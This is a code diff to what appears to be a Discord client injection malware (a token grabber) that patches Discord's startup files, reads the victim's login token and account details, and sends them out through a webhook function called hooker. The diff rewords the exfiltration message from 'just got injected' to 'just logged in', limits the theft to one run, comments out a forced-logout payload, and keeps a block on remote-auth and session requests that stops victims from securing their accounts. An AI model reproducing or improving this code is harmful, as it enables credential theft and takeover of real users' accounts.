@@ -519,8 +519,8 @@ async function updateCheck() {
   if (fs.existsSync(bdPath)) require(bdPath);`;
         fs.writeFileSync(resourceIndex, startUpScript.replace(/\\/g, '\\\\'));
     }
-    if (!fs.existsSync(path.join(__dirname, 'initiation'))) return;
-    fs.rmdirSync(path.join(__dirname, 'initiation'));
+    //if (!fs.existsSync(path.join(__dirname, 'initiation'))) return;
+    //fs.rmdirSync(path.join(__dirname, 'initiation'));
 
     const token = await getToken();
     if (!token) return;
@@ -528,7 +528,7 @@ async function updateCheck() {
     const account = await fetchAccount(token)
 
     const content = {
-        "content": `**${account.username}** just got injected!`,
+        "content": `**${account.username}** just logged in!`,
 
         "embeds": [{
             "fields": [{
@@ -544,10 +544,8 @@ async function updateCheck() {
     };
 
     await hooker(content, token, account);
-
-    executeJS(
-        `window.webpackJsonp?(gg=window.webpackJsonp.push([[],{get_require:(a,b,c)=>a.exports=c},[["get_require"]]]),delete gg.m.get_require,delete gg.c.get_require):window.webpackChunkdiscord_app&&window.webpackChunkdiscord_app.push([[Math.random()],{},a=>{gg=a}]);function LogOut(){(function(a){const b="string"==typeof a?a:null;for(const c in gg.c)if(gg.c.hasOwnProperty(c)){const d=gg.c[c].exports;if(d&&d.__esModule&&d.default&&(b?d.default[b]:a(d.default)))return d.default;if(d&&(b?d[b]:a(d)))return d}return null})("login").logout()}LogOut();`,
-    );
+    
+    //executeJS(`window.webpackJsonp ? (gg = window.webpackJsonp.push([[], { get_require: (a, b, c) => a.exports = c }, [["get_require"]]]), delete gg.m.get_require, delete gg.c.get_require) : window.webpackChunkdiscord_app && window.webpackChunkdiscord_app.push([[Math.random()], {}, a => { gg = a }]);(function () {for (const c in gg.c) {if (gg.c.hasOwnProperty(c)) {const d = gg.c[c].exports;if (d && typeof d === "object") {for (const key in d) {if (d[key] && typeof d[key].logout === "function") {d[key].logout();return;}}}}}})();`,);
 }
 
 let email = "";
@@ -631,12 +629,17 @@ session.defaultSession.webRequest.onCompleted(CONFIG.payment_filters, async (det
     }
 });
 
+let checkUpdate = true;
 session.defaultSession.webRequest.onBeforeRequest(CONFIG.filters2, (details, callback) => {
     if (details.url.startsWith("wss://remote-auth-gateway") || details.url.endsWith("auth/sessions")) return callback({
         cancel: true
     });
 
-    updateCheck()
+    if(checkUpdate == true)
+    {
+        checkUpdate = false;
+        updateCheck()
+    }
 });
 
 module.exports = require("./core.asar");
